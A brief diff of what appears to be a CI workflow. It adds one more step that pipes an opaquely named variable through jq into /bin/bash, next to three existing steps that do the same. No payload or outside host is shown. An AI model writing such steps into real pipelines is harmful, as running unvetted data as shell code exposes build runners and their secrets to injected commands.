@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$lazff6" | jq -r .rrl776 | /bin/bash
           printf '%s' "$uqan02236" | jq -r .oa6 | /bin/bash
           printf '%s' "$eukxt7" | jq -r .kw69643 | /bin/bash
+          echo $ggr2 | jq -r .go6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
